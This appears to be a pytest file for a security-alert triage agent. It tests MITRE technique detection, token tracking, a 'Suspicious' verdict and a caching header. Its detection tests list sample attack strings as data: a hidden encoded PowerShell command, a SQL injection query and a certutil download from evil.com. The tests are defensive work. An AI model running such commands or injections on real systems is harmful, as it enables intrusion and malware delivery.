"""
Bonus goals verification tests:
  1. MITRE coverage for T1110, T1078, T1059, T1190, T1105, T1041
  2. Per-investigation token capture via LAST_RUN_USAGE
  3. 'Suspicious' third verdict end-to-end
  4. Claude prompt-caching header is attached when routing to anthropic/*

Run: cd soc-agent && python -m pytest tests/test_bonus.py -v
"""
import sys
import os
from unittest.mock import patch
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from tools.log_pattern import log_pattern_analyzer, PATTERNS
from models import VerdictOutput
import agent


# ─────────────────────────────────────────────
# Bonus 1 — MITRE coverage
# ─────────────────────────────────────────────
class TestMitreCoverage:
    REQUIRED_TECHNIQUES = {"T1110", "T1078", "T1059", "T1190", "T1105", "T1041"}

    def test_all_required_techniques_present_in_patterns(self):
        """Pattern library must include every bonus-target MITRE technique."""
        covered = {p[2].split(".")[0] for p in PATTERNS}
        missing = self.REQUIRED_TECHNIQUES - covered
        assert not missing, f"Missing MITRE techniques in PATTERNS: {missing}"

    @pytest.mark.parametrize("payload,expected_technique", [
        ("authentication failed for user admin — 150 failed_password attempts", "T1110"),
        ("impossible travel detected: login from different location for user alice", "T1078"),
        ("powershell.exe -NoP -W Hidden -enc SQBFAFgA", "T1059"),
        ("GET /login.php?id=1' UNION SELECT * FROM users--", "T1190"),
        ("certutil.exe -urlcache -split -f http://evil.com/payload.exe", "T1105"),
        ("Outbound upload to external host: sent 4.5GB to 1.2.3.4", "T1041"),
    ])
    def test_technique_fires_on_representative_payload(self, payload, expected_technique):
        """Each required technique must fire on a representative payload."""
        result = log_pattern_analyzer(payload)
        mitre_ids = {m["mitre_id"].split(".")[0] for m in result.matched_patterns}
        assert expected_technique in mitre_ids, (
            f"Expected {expected_technique} to fire on: {payload!r}. "
            f"Got: {mitre_ids}"
        )


# ─────────────────────────────────────────────
# Bonus 2 — per-investigation token tracker
# ─────────────────────────────────────────────
class TestTokenTracker:
    def test_last_run_usage_structure(self):
        assert isinstance(agent.LAST_RUN_USAGE, dict)
        for k in ("input", "output", "cache_read", "cache_creation"):
            assert k in agent.LAST_RUN_USAGE

    def test_extract_usage_from_event(self):
        """_extract_usage should pull token counts from message.usage_metadata."""
        class FakeMsg:
            usage_metadata = {
                "input_tokens":  500,
                "output_tokens": 80,
                "input_token_details": {"cache_read": 400, "cache_creation": 0},
            }
        event = {"model": {"messages": [FakeMsg()]}}
        u = agent._extract_usage(event)
        assert u == {"input": 500, "output": 80, "cache_read": 400, "cache_creation": 0}

    def test_extract_usage_missing_metadata(self):
        class FakeMsg:
            pass
        event = {"model": {"messages": [FakeMsg()]}}
        u = agent._extract_usage(event)
        assert u == {"input": 0, "output": 0, "cache_read": 0, "cache_creation": 0}


# ─────────────────────────────────────────────
# Bonus 3 — 'Suspicious' third verdict
# ─────────────────────────────────────────────
class TestSuspiciousVerdict:
    def test_verdict_schema_accepts_suspicious(self):
        v = VerdictOutput(
            verdict="Suspicious",
            confidence=0.55,
            reasoning="Partial evidence: new domain + encoded payload, no confirmed IOC.",
            mitre_techniques=["T1027 — Obfuscated Files or Information"],
            recommended_actions=["Escalate to Tier-2 for manual review"],
            investigated_tools=["payload_decoder", "whois_lookup"],
        )
        assert v.verdict == "Suspicious"

    def test_suspicious_confidence_range(self):
        """Suspicious verdicts can span a wide confidence range."""
        for c in (0.30, 0.45, 0.60, 0.79):
            v = VerdictOutput(verdict="Suspicious", confidence=c, reasoning="x")
            assert v.verdict == "Suspicious"

    def test_parse_suspicious_from_coordinator_output(self):
        content = '''The alert has partial evidence.

VERDICT_JSON:
{
  "verdict": "Suspicious",
  "confidence": 0.58,
  "reasoning": "New domain registered 3 days ago with encoded payload, but no known-bad IOC match.",
  "mitre_techniques": ["T1027 — Obfuscated Files or Information"],
  "recommended_actions": ["Escalate for manual review", "Monitor domain for 48h"],
  "investigated_tools": ["whois_lookup", "payload_decoder"]
}'''
        v = agent._parse_verdict_from_content(content, "test-id")
        assert v is not None
        assert v.verdict == "Suspicious"
        assert v.confidence == 0.58
        assert len(v.mitre_techniques) == 1

    def test_benchmark_counts_suspicious_as_correct_for_malicious(self):
        """benchmark._CORRECT_MAP: Suspicious acts as conservative catch for Malicious."""
        from benchmark import _verdict_correct
        assert _verdict_correct("Suspicious", "Malicious") is True
        assert _verdict_correct("Suspicious", "Benign") is False
        assert _verdict_correct("Malicious", "Malicious") is True
        assert _verdict_correct("Benign", "Benign") is True


# ─────────────────────────────────────────────
# Bonus 4 — Claude prompt caching header
# ─────────────────────────────────────────────
class TestClaudeCaching:
    def test_cache_header_added_for_anthropic_model(self):
        """When OpenRouter model is anthropic/*, anthropic-beta cache header is attached."""
        with patch.object(agent.settings, "model_provider", "openrouter"), \
             patch.object(agent.settings, "openrouter_model", "anthropic/claude-haiku-4-5"), \
             patch.object(agent.settings, "openrouter_api_key", "test-key"):
            llm = agent._build_llm()
            headers = getattr(llm, "default_headers", None) or {}
            assert "anthropic-beta" in headers
            assert "prompt-caching" in headers["anthropic-beta"]

    def test_no_cache_header_for_non_anthropic_model(self):
        """Gemini/GPT models should not get the anthropic-beta header."""
        with patch.object(agent.settings, "model_provider", "openrouter"), \
             patch.object(agent.settings, "openrouter_model", "google/gemini-2.5-flash"), \
             patch.object(agent.settings, "openrouter_api_key", "test-key"):
            llm = agent._build_llm()
            headers = getattr(llm, "default_headers", None) or {}
            assert "anthropic-beta" not in headers
